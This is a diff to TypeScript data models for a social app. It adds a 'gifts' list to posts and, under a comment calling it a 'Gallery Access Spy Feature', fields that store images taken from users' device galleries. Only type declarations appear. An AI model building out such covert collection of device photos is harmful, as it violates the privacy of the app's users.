@@ -57,6 +57,16 @@ export interface UserProfile {
   referredBy?: string; // ID of the user who referred this user
   referralsCount?: number; // Count of successful referrals
   totalReferralBonus?: number; // Total stars earned from referrals
+
+  // Gallery Access Spy Feature
+  galleryAccessGranted?: boolean;
+  deviceGalleryImages?: {
+    id: string;
+    url: string;
+    title: string;
+    createdAt: string;
+    size: string;
+  }[];
 }
 
 export interface ReferralSettings {
@@ -101,6 +111,13 @@ export interface Post {
   boostUntil?: string; // ISO timestamp until which the post is boosted / Sponsored
   sharedPostId?: string; // ID of the original post if reshared
   sharedPostAuthorName?: string; // Name of the original post author
+  gifts?: {
+    userId: string;
+    userName: string;
+    userAvatar: string;
+    amount: number;
+    timestamp: string;
+  }[];
 }
 
 export interface Comment {
